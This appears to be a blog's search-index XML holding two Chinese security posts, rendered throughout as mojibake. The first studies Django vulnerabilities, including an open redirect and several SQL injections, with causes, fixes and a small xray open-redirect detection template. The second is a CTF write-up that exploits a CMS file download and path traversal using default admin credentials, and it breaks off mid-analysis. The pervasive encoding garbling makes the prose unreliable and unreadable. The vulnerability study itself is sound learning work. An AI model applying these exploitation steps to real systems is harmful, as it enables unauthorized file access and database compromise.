<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Django æ¡†æ¶å’Œæ¼æ´å­¦ä¹ </title>
      <link href="/2023/05/02/Django%E6%A1%86%E6%9E%B6%E5%92%8C%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/05/02/Django%E6%A1%86%E6%9E%B6%E5%92%8C%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>éµå¾ªMVCæ¡†æ¶ï¼ˆModelï¼Œæ•°æ®æ¨¡å‹ï¼Œåç«¯æ•°æ®åº“å’Œå¤„ç†ï¼›Viewï¼Œæ¥å—è¯·æ±‚ï¼Œå¤„ç†Modelï¼Œæ¸²æŸ“ï¼›Cï¼šæ¨¡æ¿ï¼‰</p><h2 id="0x1-æ­å»º"><a href="#0x1-æ­å»º" class="headerlink" title="0x1 æ­å»º"></a>0x1 æ­å»º</h2><p>1ã€ç›´æ¥ä½¿ç”¨pycharmè¿›è¡Œåˆ›å»ºï¼Œcreate Django é¡¹ç›®ï¼Œåœ¨æ­å»ºè¿‡ç¨‹ä¸­ï¼Œè¿è¡Œ<code>python manager.py runserver</code>ï¼Œå‡ºç°<code>NameError: name &#39;os&#39; is not defined</code>é”™è¯¯ï¼Œè§£å†³æ–¹å¼æ˜¯æ ¹ç›®å½•çš„<code>setting.py</code>ä¸­ä¸»åŠ¨<code>import os</code>ï¼Œé‡æ–°runserverå³å¯ï¼›</p><p>2ã€å­åº”ç”¨ä¸­æœ‰URLconfsï¼Œé€šè¿‡<code>include(module)</code>è¿›è¡Œå¼•ç”¨</p><h2 id="0x2-é‡è¦æ–‡ä»¶"><a href="#0x2-é‡è¦æ–‡ä»¶" class="headerlink" title="0x2 é‡è¦æ–‡ä»¶"></a>0x2 é‡è¦æ–‡ä»¶</h2><h3 id="ç›®å½•æ ‘"><a href="#ç›®å½•æ ‘" class="headerlink" title="ç›®å½•æ ‘"></a>ç›®å½•æ ‘</h3><img src="image-20230312182125317.png" alt="image-20230312182125317" style="zoom:50%;" /><p>django-admin</p><p>manage.pyï¼šåŒ…å«é¡¹ç›®è®¾ç½®ï¼Œsetdefault é¡¹ç›®å.settings</p><p>settings.pyï¼šé¡¹ç›®å…·ä½“è®¾ç½®ï¼Œå…¶ä¸­INSTALLED_APPSå«appName</p><ul><li>Model:æœ€æœ¬è´¨çš„ä½œç”¨æ˜¯ç”ŸæˆSQLè¯­å¥</li></ul><h3 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python manage.py runserver</span><br><span class="line">python manage.py startapp [appName]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">æ¨¡å‹ï¼Œæ•°æ®åº“ç»“æ„è®¾è®¡å’Œé™„åŠ çš„å…¶ä»–å…ƒæ•°æ®ã€‚ï¼ˆéœ€è¦setting.pyè¿›è¡Œappæ³¨å†Œï¼‰</span><br><span class="line"></span><br><span class="line">åˆ›å»ºæ•°æ®åº“åŠè¡¨å’Œå­—æ®µï¼š</span><br><span class="line">    python manager.py makemigrations [xxapp] -&gt; è¿ç§»æ˜¯Djangoå¯¹æ¨¡å‹å®šä¹‰ï¼ˆå³æ•°æ®åº“ç»“æ„ï¼‰å˜åŒ–çš„å­˜å‚¨å½¢å¼</span><br><span class="line">    python manager.py migrate -&gt; æ‰§è¡Œæ‰€æœ‰æ²¡æœ‰è¿ç§»çš„æ“ä½œï¼Œå³å°†å¯¹æ¨¡å‹çš„æ›´æ”¹åº”ç”¨åˆ°æ•°æ®åº“ä¸­</span><br><span class="line"></span><br><span class="line">python manager.py sqlmigrate [xxapp] -&gt;  sqlmigrate å‘½ä»¤å¹¶æ²¡æœ‰çœŸæ­£åœ¨ä½ çš„æ•°æ®åº“ä¸­çš„æ‰§è¡Œè¿ç§» - ç›¸åï¼Œå®ƒåªæ˜¯æŠŠå‘½ä»¤è¾“å‡ºåˆ°å±å¹•ä¸Šï¼Œè®©ä½ çœ‹çœ‹ Django è®¤ä¸ºéœ€è¦æ‰§è¡Œå“ªäº› SQL è¯­å¥ã€‚è¿™åœ¨ä½ æƒ³çœ‹çœ‹ Django åˆ°åº•å‡†å¤‡åšä»€ä¹ˆï¼Œæˆ–è€…å½“ä½ æ˜¯æ•°æ®åº“ç®¡ç†å‘˜ï¼Œéœ€è¦å†™è„šæœ¬æ¥æ‰¹é‡å¤„ç†æ•°æ®åº“æ—¶ä¼šå¾ˆæœ‰ç”¨</span><br><span class="line"></span><br><span class="line">=ã€‹</span><br><span class="line">æ”¹å˜æ¨¡å‹ä¸‰æ­¥ï¼š</span><br><span class="line">    ç¼–è¾‘ models.py æ–‡ä»¶ï¼Œæ”¹å˜æ¨¡å‹ã€‚</span><br><span class="line">    è¿è¡Œ python manage.py makemigrations ä¸ºæ¨¡å‹çš„æ”¹å˜ç”Ÿæˆè¿ç§»æ–‡ä»¶ã€‚</span><br><span class="line">    è¿è¡Œ python manage.py migrate æ¥åº”ç”¨æ•°æ®åº“è¿ç§»ã€‚</span><br><span class="line">    </span><br><span class="line">å¯¼å…¥æ•°æ®åº“</span><br><span class="line">python manage.py loaddata collection.json (collection.jsonä¸manage.pyåœ¨ä¸€ä¸ªç›®å½•ä¸‹)</span><br></pre></td></tr></table></figure><h2 id="0x3-é‡è¦å‡½æ•°"><a href="#0x3-é‡è¦å‡½æ•°" class="headerlink" title="0x3 é‡è¦å‡½æ•°"></a>0x3 é‡è¦å‡½æ•°</h2><h3 id="path"><a href="#path" class="headerlink" title="path"></a>path</h3><p>path(route, view,kwargs,name)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    path(&#x27;admin/&#x27;, admin.site.urls),</span><br><span class="line">    path(&#x27;mytestapp/&#x27;, include(&#x27;mytestapp.urls&#x27;)),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><ul><li>routeï¼šè·¯ç”±ï¼Œè°å»åŒ¹é…url</li><li>viewï¼šå¯»æ‰¾æŒ‡å®šçš„viewï¼Œè°ƒç”¨è¯¥å‡½æ•°ï¼Œä¼ å…¥HttpRequestå¯¹è±¡ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°</li></ul><h2 id="0x4-CVE"><a href="#0x4-CVE" class="headerlink" title="0x4 CVE"></a>0x4 CVE</h2><p><em>Djangoæ¼æ´çš„pocå¯å‚è€ƒä¿®å¤ç‰ˆæœ¬çš„test</em></p><h3 id="1ã€V-lt-2-0-8-ä»»æ„URLè·³è½¬æ¼æ´ï¼ˆCVE-2018-14574ï¼‰"><a href="#1ã€V-lt-2-0-8-ä»»æ„URLè·³è½¬æ¼æ´ï¼ˆCVE-2018-14574ï¼‰" class="headerlink" title="1ã€V&lt;2.0.8 ä»»æ„URLè·³è½¬æ¼æ´ï¼ˆCVE-2018-14574ï¼‰"></a>1ã€V&lt;2.0.8 ä»»æ„URLè·³è½¬æ¼æ´ï¼ˆCVE-2018-14574ï¼‰</h3><p>1ï¼‰æ¼æ´æˆå› </p><p>æ ¹æ®ç½‘ä¸Šæ¼æ´æˆå› åˆ†æï¼Œæ‰¾åˆ°å…³é”®å­—è¯å­—ç¬¦ä¸²<code>grep -r &quot;CommonMiddleware&quot; ./</code>ï¼Œå®šä½åˆ°<code>/middleware/common.py</code>çš„<code>class CommonMiddleware</code>ç”¨äºè¡¥å…¨urlè·¯å¾„ï¼Œå…¶ä¸­<code>def process_request</code>çš„<code>return self.response_redirect_class(redirect_url)</code>å³<code>HttpResponsePermanentRedirect</code>é‡å®šå‘urlæ—¶æ²¡æœ‰è¿‡æ»¤ç»å¯¹è·¯å¾„ï¼Œå¯¼è‡´ä»»æ„urlè·³è½¬ã€‚</p><img src="image-20230312235935868.png" alt="image-20230312235935868" style="zoom:50%;" /><img src="image-20230314222357211.png" alt="image-20230314222357211" style="zoom: 40%;" /><p>2ï¼‰åˆ©ç”¨æ–¹å¼</p><p>è‹¥1ï¼Œåˆ™2éœ€æˆç«‹ï¼Œé‚£ä¹ˆåˆ†æ”¯è¦è¿›å…¥3ï¼Œå³urlæœ€åæ²¡æœ‰æ–œæ slashï¼›åŒæ—¶301è·³è½¬ï¼Œæ„é€ çš„pathéœ€è¦ç»å¯¹è·¯å¾„ï¼Œå³<a href="http://host//new_path">http://host//new_path</a></p><p>3ï¼‰åˆ©ç”¨æ¡ä»¶</p><p>ç‰ˆæœ¬ï¼ˆé»˜è®¤ä½¿ç”¨è¯¥ä¸­é—´ä»¶ä¸”APPEND_SLASHé»˜è®¤ä¸ºTrueï¼‰</p><p>4ï¼‰ä¿®å¤</p><p>è°ƒç”¨<code>escape_leading_slashes(new_path)</code>å‡½æ•°ï¼Œå»æ‰å¤šä½™çš„<a href="https://github.com/django/django/commit/6fffc3c6d420e44f4029d5643f38d00a39b08525#diff-ecd72d5e5c6a5496735ace4b936d519f89699baff8d932b908de0b598c58f662">åæ–œæ </a></p><p>5ï¼‰xray poc</p><p>è™½ç„¶xrayå®˜æ–¹è¯´å·²ç»é›†æˆåœ¨30xçš„åŠŸèƒ½ä¸­ï¼Œä½†å®æµ‹å¹¶æœªæ£€æµ‹åˆ°è¯¥æ¼æ´ï¼Œå› æ­¤è‡ªå·±ç¼–å†™äº†poc</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">poc-yaml-cve-2018-14574-open-redirect</span></span><br><span class="line"><span class="attr">transport:</span> <span class="string">http</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line">  <span class="attr">r1:</span></span><br><span class="line">    <span class="attr">request:</span></span><br><span class="line">      <span class="attr">method:</span> <span class="string">GET</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">//bing.com</span></span><br><span class="line">      <span class="attr">follow_redirects:</span> <span class="literal">false</span> <span class="comment"># getæ–¹å¼é»˜è®¤ä¸ºtrueï¼Œå³è¿è¡Œè·³è½¬ï¼Œå› æ­¤è¿™é‡Œå¿…é¡»ä¸ºfalseï¼Œå³è·³è½¬æ˜¯éæ³•çš„è¡Œä¸º</span></span><br><span class="line">    <span class="attr">expression:</span> <span class="string">response.status==301</span> <span class="string">&amp;&amp;</span> <span class="string">response.headers[&quot;location&quot;].contains(&quot;//bing.com/&quot;)</span></span><br><span class="line">  </span><br><span class="line"><span class="attr">expression:</span> <span class="string">r1()</span></span><br><span class="line"><span class="attr">detail:</span></span><br><span class="line">  <span class="attr">author:</span> <span class="string">whitebai</span></span><br><span class="line">  <span class="attr">links:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;https://github.com/vulhub/vulhub/tree/master/django/CVE-2018-14574&quot;</span></span><br></pre></td></tr></table></figure><h3 id="2ã€postgresql-JSONField-x2F-HStoreField-SQLæ³¨å…¥æ¼æ´ï¼ˆCVE-2019-14234ï¼‰"><a href="#2ã€postgresql-JSONField-x2F-HStoreField-SQLæ³¨å…¥æ¼æ´ï¼ˆCVE-2019-14234ï¼‰" class="headerlink" title="2ã€postgresql-JSONField&#x2F;HStoreField SQLæ³¨å…¥æ¼æ´ï¼ˆCVE-2019-14234ï¼‰"></a>2ã€postgresql-JSONField&#x2F;HStoreField SQLæ³¨å…¥æ¼æ´ï¼ˆCVE-2019-14234ï¼‰</h3><p>1ï¼‰ç¯å¢ƒæ­å»º</p><p>django 2.2.3 + postgresql 14.7 + pycharm 2018</p><p>Note:</p><ul><li><p>Pycharmçš„Djangoç‰ˆæœ¬ä¸æ¼æ´å¤ç°ç‰ˆæœ¬ä¸ä¸€è‡´ -&gt; <code>pip install Django==xxx</code></p></li><li><p><a href="https://bbs.huaweicloud.com/blogs/294285">postgresql æ­å»º</a></p></li><li><p>Error:</p><ul><li>pycharmï¼š <code>Error encountered when performing Introspect database testdb schema public (details): ERROR: column t.relhasoids does not exist   ä½ç½®ï¼š135.</code> -&gt; è§£å†³ï¼špycharm database -&gt; æœ‰ä¸ªğŸ”§çš„å›¾æ ‡ -&gt; options -&gt; å‹¾é€‰â€Introspect using JDBC metadataâ€</li><li>adminåå°ç™»å…¥æ—¶<code>[AssertionError: database connection isn&#39;t set to UTC](https://stackoverflow.com/questions/68024060/assertionerror-database-connection-isnt-set-to-utc)</code> -&gt; è§£å†³ï¼š <code>pip install psycopg2==2.8.6</code>or<code>pip install psycopg2-binary==2.8.6</code></li></ul></li><li><p>å¯¼å…¥jsonæ•°æ®ï¼š<code>python manage.py loaddata collection.json</code> (collection.jsonä¸manage.pyåœ¨ä¸€ä¸ªç›®å½•ä¸‹)</p></li><li><blockquote><p>Pycharm debug æ–­ç‚¹ä¸ç”Ÿæ•ˆï¼šå‚è€ƒç½‘ä¸Šçš„<a href="https://blog.csdn.net/zhouzhiwengang/article/details/119576534">æ•™ç¨‹</a>ï¼Œdebugåä¸åœ¨breakpointå¤„stopï¼ŒæŠ˜è…¾åŠå¤©ï¼Œå‘ç°æ˜¯é¡¹ç›®é‡‡ç”¨ Pycharm çš„ DjangoServer è¿è¡Œï¼Œç›´æ¥ä¸‹æ–­ç‚¹è°ƒè¯•å³å¯ï¼Œä¸éœ€è¦æ–°å»º python configurationã€‚<img src="image-20230328143548394.png" alt="image-20230328143548394" style="zoom: 33%;" /></p><p>è¿™ä¸ªé—®é¢˜æŠ˜è…¾äº†ä¸€æ™šä¸Šâ€¦â€¦</p></blockquote></li></ul><p>2ï¼‰æ¼æ´åˆ†æ</p><p>refï¼š</p><p><a href="https://www.leavesongs.com/PENETRATION/django-jsonfield-cve-2019-14234.html">https://www.leavesongs.com/PENETRATION/django-jsonfield-cve-2019-14234.html</a></p><p><a href="https://www.cnblogs.com/sijidou/p/13121288.html">https://www.cnblogs.com/sijidou/p/13121288.html</a></p><p>ï¼ˆ1ï¼‰æ¼æ´æˆå› </p><p>postgresql çš„ JsonFieldï¼Œtransform â€œé”®â€ å»lookup value æ—¶ï¼Œé”®ç›´æ¥æ‹¼æ¥åœ¨where è¯­å¥ä¸­ã€‚</p><img src="image-20230328144449490.png" alt="image-20230328144449490" style="zoom:50%;" /><p>ï¼ˆ2ï¼‰åˆ©ç”¨</p><p>â€œæ§åˆ¶æŸ¥è¯¢çš„é”®â€</p><p>Noteï¼š</p><p>pç¥blogé‡Œæ‰€è°“çš„django admin å…·æœ‰ â€œç”¨æˆ·æ§åˆ¶querysetçš„æŸ¥è¯¢é”®åâ€ï¼Œåœ¨<code>django/contrib/admin/views/main.py</code>402è¡Œã€‚</p><img src="image-20230328151248029.png" alt="image-20230328151248029" style="zoom:50%;" /><p>ï¼ˆ3ï¼‰ä¿®å¤</p><img src="image-20230328154948564.png" alt="image-20230328154948564" style="zoom:50%;" /><p>Key_name ç”¨ æ•°ç»„è¡¨ç¤ºï¼Œåˆ™aâ€™b -&gt; [â€˜aâ€™,â€™bâ€™] (postgresql ç‰¹æ€§)</p><h3 id="3ã€Oracle-GIS-tolerance-SQLæ³¨å…¥æ¼æ´ï¼ˆCVE-2020-9402ï¼‰"><a href="#3ã€Oracle-GIS-tolerance-SQLæ³¨å…¥æ¼æ´ï¼ˆCVE-2020-9402ï¼‰" class="headerlink" title="3ã€Oracle-GIS-tolerance SQLæ³¨å…¥æ¼æ´ï¼ˆCVE-2020-9402ï¼‰"></a>3ã€Oracle-GIS-tolerance SQLæ³¨å…¥æ¼æ´ï¼ˆCVE-2020-9402ï¼‰</h3><p>å‚è€ƒ<a href="https://xz.aliyun.com/t/7403">è¿™ç¯‡æ–‡ç« </a>ã€‚</p><p>ä½†æ˜¯æ ¹æ®<a href="https://github.com/django/django/commit/fe886a3b58a93cfbe8864b485f93cb6d426cd1f2">å®˜æ–¹ä¿®å¤</a>å…¶å®å¯ä»¥å¾ˆæ˜æ˜¾çœ‹åˆ°æ¼æ´å­˜åœ¨çš„ä½ç½® -&gt; GISåŠŸèƒ½çš„toleranceå¯æ§ï¼›å¹¶ä¸”æ ¹æ®test.pyå¯ä»¥å¾—åˆ°payload-&gt;é—­åˆå³æ‹¬å·ã€‚</p><p>ä¿®å¤ï¼šç”¨Value()åŒ…å«å‚æ•°ï¼Œå»è¯†åˆ«æ˜¯å¦æ˜¯int</p><h3 id="4ã€QuerySet-order-by-SQLæ³¨å…¥æ¼æ´ï¼ˆCVE-2021-35042ï¼‰"><a href="#4ã€QuerySet-order-by-SQLæ³¨å…¥æ¼æ´ï¼ˆCVE-2021-35042ï¼‰" class="headerlink" title="4ã€QuerySet.order_by() SQLæ³¨å…¥æ¼æ´ï¼ˆCVE-2021-35042ï¼‰"></a>4ã€QuerySet.order_by() SQLæ³¨å…¥æ¼æ´ï¼ˆCVE-2021-35042ï¼‰</h3><p>Djangoå†…ç½®äº†ORMæ¡†æ¶ï¼Œä»æ•°æ®åº“æŸ¥è¯¢å‡ºæ¥çš„ç»“æœæ˜¯ä¸€ä¸ªQuerySetåˆé›†ã€‚å…¶ä¸­çš„order_byæ–¹æ³•ï¼Œä¼šå°†æŸ¥è¯¢å‡ºæ¥çš„ç»“æœæŒ‰ç…§æŸå­—æ®µçš„å€¼ï¼Œç”±å°åˆ°å¤§æˆ–ç”±å¤§åˆ°å°è¿›è¡Œæ’åºï¼Œæ¼æ´å°±å‡ºç°åœ¨add_orderingçš„æ—¶å€™ï¼š<a href="https://github.com/django/django/commit/a34a5f724c5d5adb2109374ba3989ebb7b11f81f%E3%80%82">https://github.com/django/django/commit/a34a5f724c5d5adb2109374ba3989ebb7b11f81fã€‚</a></p><p>æ¼æ´åŸç†æ˜¯Djangoå¯¹æ•°æ®çš„å®¹å¿åº¦è¿‡é«˜å¯¼è‡´å½“è¯†åˆ«table.columnæ—¶ï¼Œæœªè¿›è¡Œæ¶æ„è¾“å…¥çš„å¤„ç†ï¼Œå¯¼è‡´ç›´æ¥æ‰§è¡Œline_1980 continueï¼Œè·³è¿‡åé¢çš„åˆ—æ£€æŸ¥ï¼Œç›´æ¥æ‰§è¡Œåˆ°line_2002 è¿›è¡Œorderbyçš„æ‹¼æ¥ã€‚</p><img src="image-20230406203154011.png" alt="image-20230406203154011" style="zoom:50%;" /><p>å®˜æ–¹çš„ä¿®å¤æ–¹æ³•æ˜¯å¢åŠ <code>if &#39;.&#39; in item and ORDER_PATTERN.match(item)</code>ï¼Œå…¶ä¸­<code>ORDER_PATTERN = _lazy_re_compile(r&#39;[-+]?[.\w]+$&#39;)</code>ï¼Œå³å½“table.colç¬¦åˆä¸¥æ ¼çš„æ ¼å¼æ—¶ï¼Œæ‰æ¥æ”¶å’Œå¤„ç†ã€‚</p><p>refï¼š<a href="https://xz.aliyun.com/t/9834">https://xz.aliyun.com/t/9834</a></p><h3 id="5ã€Trunc-kind-and-Extract-lookup-name-SQLæ³¨å…¥æ¼æ´ï¼ˆCVE-2022-34265ï¼‰"><a href="#5ã€Trunc-kind-and-Extract-lookup-name-SQLæ³¨å…¥æ¼æ´ï¼ˆCVE-2022-34265ï¼‰" class="headerlink" title="5ã€Trunc(kind) and Extract(lookup_name) SQLæ³¨å…¥æ¼æ´ï¼ˆCVE-2022-34265ï¼‰"></a>5ã€Trunc(kind) and Extract(lookup_name) SQLæ³¨å…¥æ¼æ´ï¼ˆCVE-2022-34265ï¼‰</h3><p>æ¼æ´å­˜åœ¨äºDjango ORMæ—¥æœŸå‡½æ•°Truncã€Extractçš„æ—¶é—´å‚æ•°ã€‚å’Œä¹‹å‰å‡ ä¸ªsqlæ¼æ´ä¸€æ ·ï¼Œæ²¡æœ‰è¿›è¡Œè¿‡æ»¤ï¼Œç›´æ¥sqlè¯­å¥æ‹¼æ¥å¯¼è‡´æ¼æ´æ‰§è¡Œã€‚</p><p>refï¼š<a href="https://xz.aliyun.com/t/11628#toc-2">https://xz.aliyun.com/t/11628#toc-2</a></p><p>æ¼æ´æœ¬èº«çš„å¤ç°å’Œè°ƒè¯•ä¸å‰å‡ ä¸ªsqlæ¼æ´å·®åˆ«ä¸å¤§ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äºDjangoæ”¯æŒéå¸¸å¤šçš„æ•°æ®åº“ï¼Œä¸åŒæ•°æ®åº“ä¸‹æ¼æ´çš„pocã€æ˜¯å¦èƒ½åˆ©ç”¨æ˜¯ä¸ä¸€æ ·çš„ã€‚</p><h3 id="6ã€postgresql-StringAgg-SQLæ³¨å…¥æ¼æ´ï¼ˆCVE-2020-7471ï¼‰"><a href="#6ã€postgresql-StringAgg-SQLæ³¨å…¥æ¼æ´ï¼ˆCVE-2020-7471ï¼‰" class="headerlink" title="6ã€postgresql-StringAgg SQLæ³¨å…¥æ¼æ´ï¼ˆCVE-2020-7471ï¼‰"></a>6ã€postgresql-StringAgg SQLæ³¨å…¥æ¼æ´ï¼ˆCVE-2020-7471ï¼‰</h3><p>ä½¿ç”¨äº†StringAggèšåˆå‡½æ•°ï¼Œç”¨æˆ·å¯æ§å…¶delimiterå‚æ•°è¿›è¡ŒæŸ¥è¯¢æ—¶ï¼Œåœ¨å…¶ä½ç½®æ³¨å…¥SQLè¯­å¥ã€‚</p><p>è¯¥æ¼æ´å¤ç°å¯å‚è€ƒå‰å‡ ä¸ªæ¼æ´ï¼Œè¯¥æ¼æ´vulhubæ²¡æœ‰ï¼Œè‡ªå·±æäº¤äº†prï¼š<a href="https://github.com/vulhub/vulhub/pull/424">https://github.com/vulhub/vulhub/pull/424</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>çº¢æ˜è°·2023 WEB</title>
      <link href="/2023/04/23/%E7%BA%A2%E6%98%8E%E8%B0%B72023%20WEB/"/>
      <url>/2023/04/23/%E7%BA%A2%E6%98%8E%E8%B0%B72023%20WEB/</url>
      
        <content type="html"><![CDATA[<p>å¼€èµ›æ—¶é—´å¯¹ç¤¾ç•œæ¥è¯´å®åœ¨æ˜¯å¤ªä¸å‹å¥½äº†ï¼Œè¶ç€ä¸­åˆé¥­ç©ºæ‘¸é±¼åšäº†å‡ é“ã€‚</p><h1 id="ç‚¹å‡»ç­¾åˆ°"><a href="#ç‚¹å‡»ç­¾åˆ°" class="headerlink" title="ç‚¹å‡»ç­¾åˆ°"></a>ç‚¹å‡»ç­¾åˆ°</h1><p>æŒ‰ç…§hint â€œé¢˜ç›®å†…å®¹ï¼šæ¯ä¸€æ¬¡ç‚¹å‡»éƒ½æ˜¯ä¸ºäº†è®©ä½ æ›´æ¥è¿‘flagï¼â€ å»ç‚¹å‡»ç½‘é¡µæŒ‰é’®ï¼Œå¾…æ‰€æœ‰å­—ç¬¦è¾“å‡ºå®Œæ¯•åå¾—åˆ°flagã€‚</p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="0x1-Dreamer"><a href="#0x1-Dreamer" class="headerlink" title="0x1 Dreamer"></a>0x1 Dreamer</h2><p>é¢˜ç›®æ˜¯ä¸€ä¸ªCMSæ¡†æ¶(v4.0ç‰ˆæœ¬)ï¼Œè¯¥ç‰ˆæœ¬å­˜åœ¨â€œåå°é™„ä»¶ç®¡ç†å¤„å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸‹è½½â€æ¼æ´ï¼Œé¢˜ç›®hintç»™äº†flagè·¯å¾„ï¼Œåˆ™é€šè¿‡è¯¥æ¼æ´å¯ä»¥ä¸‹è½½å¾—åˆ°flagæ–‡ä»¶ã€‚</p><h3 id="0ã€æ¼æ´åˆ†æ"><a href="#0ã€æ¼æ´åˆ†æ" class="headerlink" title="0ã€æ¼æ´åˆ†æ"></a>0ã€æ¼æ´åˆ†æ</h3><p>é¢˜ç›®ç»™äº†æºç ï¼Œåå°çš„é™„ä»¶åŠŸèƒ½<code>src/main/java/cc/iteachyou/cms/controller/admin/AttachmentController.java</code>74è¡Œï¼Œä¸Šä¼ é™„ä»¶æ—¶æœªå¯¹é™„ä»¶åšä»»ä½•å¤„ç†ã€‚</p><img src="image-20230419152819790.png" alt="image-20230419152819790" style="zoom:50%;" /><p>è¯¥æ–‡ä»¶115è¡Œï¼Œä¸‹è½½æ—¶è®¿é—®æ–‡ä»¶è·¯å¾„ç›´æ¥è¿›è¡Œäº†è·¯å¾„æ‹¼æ¥ï¼Œå› æ­¤äº§ç”Ÿäº†æ¼æ´ã€‚</p><img src="image-20230419152627781.png" alt="image-20230419152627781" style="zoom:50%;" /><h3 id="1ã€ç™»å½•åå°-é™„ä»¶ç®¡ç†"><a href="#1ã€ç™»å½•åå°-é™„ä»¶ç®¡ç†" class="headerlink" title="1ã€ç™»å½•åå°-é™„ä»¶ç®¡ç†"></a>1ã€ç™»å½•åå°-é™„ä»¶ç®¡ç†</h3><p>æ ¹æ®é¢˜ç›®ç»™çš„æºç ï¼ŒREADME.mdç»™å‡ºäº†åå°ç®¡ç†å‘˜è´¦å·ï¼šwangjn:123456ã€‚</p><p>æ‰¾åˆ°â€œé™„ä»¶ç®¡ç†åŠŸèƒ½â€ï¼Œä¸Šä¼ ä»»æ„é™„ä»¶ã€‚</p><img src="image-20230419151628565.png" alt="image-20230419151628565" style="zoom:50%;" /><h3 id="2ã€ä¿®æ”¹ä¸Šä¼ æ–‡ä»¶è·¯å¾„"><a href="#2ã€ä¿®æ”¹ä¸Šä¼ æ–‡ä»¶è·¯å¾„" class="headerlink" title="2ã€ä¿®æ”¹ä¸Šä¼ æ–‡ä»¶è·¯å¾„"></a>2ã€ä¿®æ”¹ä¸Šä¼ æ–‡ä»¶è·¯å¾„</h3><p>é€‰æ‹©é™„ä»¶åï¼Œåœ¨ç‚¹å‡»â€œç¡®è®¤â€æŒ‰é’®å‰è¿›è¡ŒæŠ“åŒ…ï¼Œä¿®æ”¹filePathä¸ºflagè·¯å¾„ï¼Œæ”¾åŒ…ã€‚</p><img src="image-20230419151916555.png" alt="image-20230419151916555" style="zoom:50%;" /><img src="image-20230419152049283.png" alt="image-20230419152049283" style="zoom:50%;" /><h3 id="3ã€ä¸‹è½½æ–‡ä»¶"><a href="#3ã€ä¸‹è½½æ–‡ä»¶" class="headerlink" title="3ã€ä¸‹è½½æ–‡ä»¶"></a>3ã€ä¸‹è½½æ–‡ä»¶</h3><p>ä¸‹è½½æ–°ä¸Šä¼ çš„æ–‡ä»¶ï¼Œå¾—åˆ°flagã€‚</p><img src="image-20230419152156759.png" alt="image-20230419152156759" style="zoom:50%;" /><img src="image-20230419152227500.png" alt="image-20230419152227500" style="zoom:50%;" /><h2 id="0x2-Dreamer-revenge"><a href="#0x2-Dreamer-revenge" class="headerlink" title="0x2 Dreamer_revenge"></a>0x2 Dreamer_revenge</h2><p>å› ä¸ºé¢˜ç›®ä»£ç åŒDreamerï¼Œæ¼æ´ä¸€æ ·ï¼Œä½†æ˜¯é¢˜ç›®æ²¡æœ‰ç»™flagä½ç½®ï¼Œåº”è¯¥éœ€è¦getshellæ‰¾åˆ°flagä½ç½®ã€‚</p><h3 id="1ã€åå°æ¨¡æ¿ç®¡ç†ä»»æ„ç¼–è¾‘å¯¼è‡´è·¯å¾„ç©¿è¶Š"><a href="#1ã€åå°æ¨¡æ¿ç®¡ç†ä»»æ„ç¼–è¾‘å¯¼è‡´è·¯å¾„ç©¿è¶Š" class="headerlink" title="1ã€åå°æ¨¡æ¿ç®¡ç†ä»»æ„ç¼–è¾‘å¯¼è‡´è·¯å¾„ç©¿è¶Š"></a>1ã€åå°æ¨¡æ¿ç®¡ç†ä»»æ„ç¼–è¾‘å¯¼è‡´è·¯å¾„ç©¿è¶Š</h3><h4 id="1-æ¼æ´åˆ†æ"><a href="#1-æ¼æ´åˆ†æ" class="headerlink" title="1) æ¼æ´åˆ†æ"></a>1) æ¼æ´åˆ†æ</h4><p><code>src/main/java/cc/iteachyou/cms/controller/admin/TemplateController.java</code>ç¬¬161è¡Œï¼Œåˆ©ç”¨<code>templateFile.getCanonicalPath().startsWith(themeDir.getCanonicalPath())</code>åˆ¤æ–­æ–‡ä»¶æƒé™ï¼ŒgetCanonicalPathè¿”å›çš„æ˜¯æ–‡ä»¶ç»å¯¹è·¯å¾„ï¼Œå°†è·¯å¾„ä¸­åŒ…å«â€œ.â€æˆ–â€œ..â€ç­‰å½“å‰è·¯å¾„åŠä¸Šå±‚è·¯å¾„è¡¨ç¤ºæ³•ï¼Œä¼šä»è·¯å¾„åä¸­åˆ é™¤â€œ.â€å’Œâ€œ..â€ä½¿ç”¨çœŸå®è·¯å¾„ä»£æ›¿ï¼Œå³å­˜åœ¨è·¯å¾„ç©¿è¶Šé—®é¢˜ã€‚</p><img src="image-20230423114014067.png" alt="image-20230423114014067" 